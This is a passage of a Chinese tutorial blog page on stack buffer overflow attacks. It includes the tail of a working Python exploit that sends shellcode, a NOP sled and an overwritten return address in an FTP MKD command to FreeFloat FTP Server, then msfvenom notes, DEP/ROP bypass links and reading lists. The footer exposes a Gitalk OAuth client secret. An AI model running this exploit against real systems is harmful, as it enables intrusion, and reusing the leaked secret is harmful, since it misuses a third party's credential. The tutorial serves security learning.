class="string">"\x57\x06\x72\x80\x25\x9b\x73\x46\x22\xa3\x0b\xe3\xf4\x50\xa6"</span></span><br><span class="line">        <span class="string">"\xea\x24\xc8\xbd\xa5\xdc\x62\x99\x15\xdd\xa7\xf9\x6a\x94\xcc"</span></span><br><span class="line">        <span class="string">"\xca\x19\x27\x05\x03\xe1\x16\x69\xc8\xdc\x97\x64\x10\x18\x1f"</span></span><br><span class="line">        <span class="string">"\x97\x67\x52\x5c\x2a\x70\xa1\x1f\xf0\xf5\x34\x87\x73\xad\x9c"</span></span><br><span class="line">        <span class="string">"\x36\x57\x28\x56\x34\x1c\x3e\x30\x58\xa3\x93\x4a\x64\x28\x12"</span></span><br><span class="line">        <span class="string">"\x9d\xed\x6a\x31\x39\xb6\x29\x58\x18\x12\x9f\x65\x7a\xfa\x40"</span></span><br><span class="line">        <span class="string">"\xc0\xf0\xe8\x95\x72\x5b\x66\x6b\xf6\xe1\xcf\x6b\x08\xea\x7f"</span></span><br><span class="line">        <span class="string">"\x04\x39\x61\x10\x53\xc6\xa0\x55\xab\x8c\xe9\xff\x24\x49\x78"</span></span><br><span class="line">        <span class="string">"\x42\x29\x6a\x56\x80\x54\xe9\x53\x78\xa3\xf1\x11\x7d\xef\xb5"</span></span><br><span class="line">        <span class="string">"\xca\x0f\x60\x50\xed\xbc\x81\x71\x8e\x23\x12\x19\x7f\xc6\x92"</span></span><br><span class="line">        <span class="string">"\xb8\x7f"</span></span><br><span class="line">    )</span><br><span class="line">    buffer = <span class="string">'\x90'</span> * <span class="number">20</span> + shellcode</span><br><span class="line">    exploit = <span class="string">'A'</span> * <span class="number">248</span> + <span class="string">'\xed\x1e\x94\x7c'</span> + buffer + <span class="string">'C'</span> * (<span class="number">748</span> - len(buffer))</span><br><span class="line">    s.send(<span class="string">'MKD'</span> + exploit + <span class="string">'\r\n'</span>)</span><br><span class="line">    <span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    s.send(<span class="string">'QUIT\r\n'</span>)</span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    send_exploit()</span><br></pre></td></tr></table></figure></p>
+<h4 id="命令生成-ShellCode"><a href="#命令生成-ShellCode" class="headerlink" title="命令生成 ShellCode"></a><strong>命令生成 ShellCode</strong></h4><p>另外，ShellCode 也可以通过 Metasploit Framework 中的 <code>msfvenom</code> 命令（包括了 msfpayload 和 msfencode 命令）来生成。msfvenom 命令参数如下图所示：<br><img src="/images/security/hack/buffer-overflow-attack/msfvenom-parameter.png" alt>  </p>
+<p>生成打开系统计算器的 ShellCode 的命令参数样例 1：<br><img src="/images/security/hack/buffer-overflow-attack/msfvenom-with-concise-parameter.png" alt>  </p>
+<p>生成打开系统计算器的 ShellCode 的命令参数样例 2：<br><img src="/images/security/hack/buffer-overflow-attack/msfvenom-with-detail-parameter.png" alt>  </p>
+<h4 id="写代码生成-ShellCode"><a href="#写代码生成-ShellCode" class="headerlink" title="写代码生成 ShellCode"></a><strong>写代码生成 ShellCode</strong></h4><p><a href="http://www.fuzzysecurity.com/tutorials/expDev/6.html" target="_blank" rel="noopener">Writing W32 shellcode</a></p>
+<h2 id="绕过-DEP-机制"><a href="#绕过-DEP-机制" class="headerlink" title="绕过 DEP 机制"></a><strong>绕过 DEP 机制</strong></h2><ul>
+<li><a href="http://security.stackexchange.com/questions/18556/how-do-aslr-and-dep-work" target="_blank" rel="noopener">How do ASLR and DEP work?</a></li>
+<li><a href="http://www.arkteam.net/?p=443" target="_blank" rel="noopener">ASLR/DEP绕过技术概览</a></li>
+<li><a href="https://www.exploit-db.com/docs/28479.pdf" target="_blank" rel="noopener">Return-Oriented-Programming</a></li>
+<li><a href="https://www.corelan.be/index.php/2010/06/16/exploit-writing-tutorial-part-10-chaining-dep-with-rop-the-rubikstm-cube/" target="_blank" rel="noopener">exploit-writing-tutorial-part-10-chaining-dep-with-rop-the-rubikstm-cube</a></li>
+<li><a href="http://rickgray.me/2014/08/26/bypass-dep-with-rop-study.html" target="_blank" rel="noopener">ROP 技术绕过 DEP 初学习</a></li>
+<li><a href="https://samsclass.info/127/proj/rop.htm" target="_blank" rel="noopener">Defeating DEP with ROP</a> 中文：<a href="http://drops.wooyun.org/papers/3602" target="_blank" rel="noopener">利用ROP绕过DEP（Defeating DEP with ROP）调试笔记</a></li>
+<li><a href="http://blog.osom.info/2012/04/return-oriented-programming-rop-exploit.html" target="_blank" rel="noopener">Return-Oriented Programming (ROP) Exploit Example</a></li>
+<li><a href="http://thesprawl.org/research/corelan-tutorial-10-exercise-solution/" target="_blank" rel="noopener">corelan tutorial 10 exercise solution</a></li>
+<li><a href="http://blog.csdn.net/jiayanhui2877/article/details/48496145" target="_blank" rel="noopener">Rop绕过DEP和ASRL流程实例介绍</a></li>
+<li><a href="http://www.cybersphinx.com/easy-rm-to-mp3-converter-buffer-overflow-exploit-on-windows-7/" target="_blank" rel="noopener">Easy RM to MP3 Converter Buffer Overflow Exploit on Windows 7</a></li>
+<li></li>
+</ul>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a><strong>参考资料</strong></h1><h2 id="缓冲区溢出攻击"><a href="#缓冲区溢出攻击" class="headerlink" title="缓冲区溢出攻击"></a><strong>缓冲区溢出攻击</strong></h2><ul>
+<li><a href="http://www.cnblogs.com/fanzhidongyzby/archive/2013/08/10/3250405.html" target="_blank" rel="noopener">缓冲区溢出攻击</a></li>
+<li><a href="https://samsclass.info/127/proj/vuln-server.htm" target="_blank" rel="noopener">Exploiting “Vulnerable Server” for Windows 7</a></li>
+<li><a href="http://www.freebuf.com/articles/system/88994.html" target="_blank" rel="noopener">实例讲解如何利用 Python 编写 Exploit</a></li>
+<li><a href="http://netsecurity.51cto.com/art/201111/302310.htm" target="_blank" rel="noopener">缓冲区溢出攻击专题</a></li>
+<li>针对 FreeFloatFTPServer 的攻击<ul>
+<li><a href="http://www.fuzzysecurity.com/tutorials/expDev/2.html" target="_blank" rel="noopener">Saved Return Pointer Overflows</a></li>
+<li><a href="http://hacksys.vfreaks.com/zh/research/freefloat-ftp-server-buffer-overflow.html" target="_blank" rel="noopener">流通 FTP 服务器 – 缓冲区溢出</a></li>
+<li><a href="https://www.acunetix.com/vulnerabilities/network/vulnerability/freefloat-ftp-server-post-auth-mkd-command-buffer-overflow-vulnerability/" target="_blank" rel="noopener">Freefloat FTP Server POST Auth ‘MKD’ Command Buffer Overflow Vulnerability</a></li>
+</ul>
+</li>
+<li>针对 WarFTPD 1.65 的攻击<ul>
+<li><a href="http://1.johnhome.sinaapp.com/?p=157" target="_blank" rel="noopener">漏洞挖掘实践</a></li>
+<li><a href="https://www.91ri.org/3518.html?yundun=a4238dc6d53a03acd4cc" target="_blank" rel="noopener">Fuzz WarFTPD 1.65</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="安全相关资料"><a href="#安全相关资料" class="headerlink" title="安全相关资料"></a><strong>安全相关资料</strong></h2><h3 id="网站"><a href="#网站" class="headerlink" title="网站"></a><strong>网站</strong></h3><ul>
+<li><a href="http://www.fuzzysecurity.com/index.html" target="_blank" rel="noopener">Fuzzysecurity</a></li>
+<li><a href="http://www.freebuf.com/" target="_blank" rel="noopener">Freebuf</a></li>
+<li><a href="https://www.91ri.org/" target="_blank" rel="noopener">91Ri</a></li>
+</ul>
+<h3 id="资料"><a href="#资料" class="headerlink" title="资料"></a><strong>资料</strong></h3><ul>
+<li><a href="http://www.securitysift.com/windows-exploit-development-part-1-basics/" target="_blank" rel="noopener">Windows Exploit Development Series</a></li>
+<li><a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/" target="_blank" rel="noopener">Exploit Writing Tutorial Series</a>（<a href="http://bbs.pediy.com/showthread.php?t=101217" target="_blank" rel="noopener">翻译</a>）</li>
+<li>书籍<ul>
+<li>Python 灰帽子</li>
+<li>Python 黑帽子</li>
+</ul>
+</li>
+</ul>
+<h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a><strong>工具使用</strong></h2><h3 id="Immunity-Debugger"><a href="#Immunity-Debugger" class="headerlink" title="Immunity Debugger"></a><strong>Immunity Debugger</strong></h3><ul>
+<li><a href="https://www.immunityinc.com/products/debugger/index.html" target="_blank" rel="noopener">下载地址</a>（<a href="https://github.com/kbandla/ImmunityDebugger" target="_blank" rel="noopener">Github</a>）</li>
+<li></li>
+</ul>
+<h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a><strong>Metasploit</strong></h3><ul>
+<li><a href="https://www.rapid7.com/products/metasploit/download.jsp" target="_blank" rel="noopener">Metasploit Framework 下载地址</a>（<a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="noopener">Github</a>）</li>
+<li><a href="https://www.nigesb.com/metasploit-framework-expert-course.html" target="_blank" rel="noopener">一套比较全面的 Metasploit 教程</a></li>
+<li><a href="http://www.freebuf.com/articles/web/35930.html" target="_blank" rel="noopener">Metasploit 系列教程(第一季)</a></li>
+<li><a href="http://blog.163.com/hlz_2599/blog/static/14237847420134250582793/" target="_blank" rel="noopener">Metasploit详解 详细图文教程</a>  </li>
+</ul>
+<h3 id="mona"><a href="#mona" class="headerlink" title="mona"></a><strong>mona</strong></h3><ul>
+<li><a href="https://github.com/corelan/mona" target="_blank" rel="noopener">下载地址</a></li>
+<li><a href="https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/" target="_blank" rel="noopener">mona.py – the manual</a></li>
+<li><a href="http://www.hack80.com/thread-21042-1-1.html" target="_blank" rel="noopener">Immunity Debugger - mona 插件使用</a></li>
+<li><a href="http://www.cnphp6.com/archives/45078" target="_blank" rel="noopener">Immunity Debugger mona.py 插件命令手册</a></li>
+</ul>
+<h3 id="Kali-Linux"><a href="#Kali-Linux" class="headerlink" title="Kali Linux"></a><strong>Kali Linux</strong></h3><ul>
+<li><a href="https://www.kali.org/" target="_blank" rel="noopener">官网</a></li>
+<li><a href="http://www.kali.org.cn/forum.php" target="_blank" rel="noopener">Kali Linux 中文论坛</a></li>
+</ul>
+<h3 id="Infigo-FTPStress-1"><a href="#Infigo-FTPStress-1" class="headerlink" title="Infigo FTPStress"></a><strong>Infigo FTPStress</strong></h3><ul>
+<li><a href="http://pan.baidu.com/s/1i4YY5pz" target="_blank" rel="noopener">下载地址</a></li>
+</ul>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2016/06/11/python-basics-property/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          Python 基础知识：property
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2016/03/15/ccplusplus-new-and-delete/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">C++ 中的 new/delete</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+
+
+
+      <div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+
+<script>
+var gitalk = new Gitalk({
+  clientID: '64c19d7f57bebbb343c4',
+  clientSecret: '287daeba39e73fdde92f24540c9f3c0fd5238512',
+  repo: 'BlogComments',
+  owner: 'xiemax100',
+  admin: ['xiemax100'],
+  id: md5(window.location.pathname),
+  distractionFreeMode: true
+})
+
+gitalk.render('gitalk-container')
+</script>
+
+
+
+
+
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#缓冲区溢出攻击介绍"><span class="toc-number">1.</span> <span class="toc-text">缓冲区溢出攻击介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#一、代码-lt-gt-数据"><span class="toc-number">1.1.</span> <span class="toc-text">一、代码 &lt;=&gt; 数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二、函数栈帧"><span class="toc-number">1.2.</span> <span class="toc-text">二、函数栈帧</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#三、栈溢出基本原理"><span class="toc-number">1.3.</span> <span class="toc-text">三、栈溢出基本原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#四、栈溢出攻击"><span class="toc-number">1.4.</span> <span class="toc-text">四、栈溢出攻击</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#缓冲区攻击实战"><span class="toc-number">2.</span> <span class="toc-text">缓冲区攻击实战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境说明"><span class="toc-number">2.1.</span> <span class="toc-text">环境说明</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#检测-FreeFloatFTPServer-是否存在漏洞"><span class="toc-number">2.2.</span> <span class="toc-text">检测 FreeFloatFTPServer 是否存在漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#法一：利用-Infigo-FTPStress-软件"><span class="toc-number">2.2.1.</span> <span class="toc-text">法一：利用 Infigo FTPStress 软件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Infigo-FTPStress"><span class="toc-number">2.2.1.1.</span> <span class="toc-text">Infigo FTPStress</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#攻击-USER-命令"><span class="toc-number">2.2.1.2.</span> <span class="toc-text">攻击 USER 命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#攻击-MKD-命令"><span class="toc-number">2.2.1.3.</span> <span class="toc-text">攻击 MKD 命令</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#法二：代码检测"><span class="toc-number">2.2.2.</span> <span class="toc-text">法二：代码检测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#确定函数返回地址的存放位置"><span class="toc-number">2.3.</span> <span class="toc-text">确定函数返回地址的存放位置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#确定攻击载体大概长度"><span class="toc-number">2.3.1.</span> <span class="toc-text">确定攻击载体大概长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#确定函数返回地址的存放位置-1"><span class="toc-number">2.3.2.</span> <span class="toc-text">确定函数返回地址的存放位置</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击"><span class="toc-number">2.4.</span> <span class="toc-text">攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#查找-jmp-esp-指令"><span class="toc-number">2.4.1.</span> <span class="toc-text">查找 jmp esp 指令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#发起攻击"><span class="toc-number">2.4.2.</span> <span class="toc-text">发起攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#利用网络-ShellCode"><span class="toc-number">2.4.2.1.</span> <span class="toc-text">利用网络 ShellCode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#命令生成-ShellCode"><span class="toc-number">2.4.2.2.</span> <span class="toc-text">命令生成 ShellCode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#写代码生成-ShellCode"><span class="toc-number">2.4.2.3.</span> <span class="toc-text">写代码生成 ShellCode</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#绕过-DEP-机制"><span class="toc-number">2.5.</span> <span class="toc-text">绕过 DEP 机制</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考资料"><span class="toc-number">3.</span> <span class="toc-text">参考资料</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#缓冲区溢出攻击"><span class="toc-number">3.1.</span> <span class="toc-text">缓冲区溢出攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#安全相关资料"><span class="toc-number">3.2.</span> <span class="toc-text">安全相关资料</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#网站"><span class="toc-number">3.2.1.</span> <span class="toc-text">网站</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#资料"><span class="toc-number">3.2.2.</span> <span class="toc-text">资料</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#工具使用"><span class="toc-number">3.3.</span> <span class="toc-text">工具使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Immunity-Debugger"><span class="toc-number">3.3.1.</span> <span class="toc-text">Immunity Debugger</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Metasploit"><span class="toc-number">3.3.2.</span> <span class="toc-text">Metasploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mona"><span class="toc-number">3.3.3.</span> <span class="toc-text">mona</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kali-Linux"><span class="toc-number">3.3.4.</span> <span class="toc-text">Kali Linux</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Infigo-FTPStress-1"><span class="toc-number">3.3.5.</span> <span class="toc-text">Infigo FTPStress</span></a></li></ol></li></ol></li></ol>
+</div>
+<style>
+    .left-col .switch-btn {
+        display: none;
+    }
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+
+<input type="button" id="tocButton" value="隐藏目录" title="点击按钮隐藏或者显示文章目录">
+
+<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script>
+    var toc_button = document.getElementById("tocButton");
+    var toc_div = document.getElementById("toc");
+    toc_button.onclick=function() {
+        if (toc_div.style.display == "none") {
+            toc_div.style.display = "block";
+            toc_button.value = "隐藏目录";
+            document.getElementById("switch-btn").style.display = "none";
+            document.getElementById("switch-area").style.display = "none";
+        }
+        else {
+            toc_div.style.display = "none";
+            toc_button.value = "显示目录";
+            document.getElementById("switch-btn").style.display = "block";
+            document.getElementById("switch-area").style.display = "block";
+        }
+    }
+
+    if ($(".toc").length < 1) {
+        $("#toc").css("display","none");
+        $("#tocButton").css("display","none");
+        $(".switch-btn").css("display","block");
+        $(".switch-area").css("display","block");
+    }
+</script>
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+    	<div class="footer-left">
+    		&copy; 2019 Max
+    	</div>
+      	<div class="footer-right">
+      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
+      	</div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script src="/js/main.js"></script>
+
+
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  </div>
+</body>
+</html>
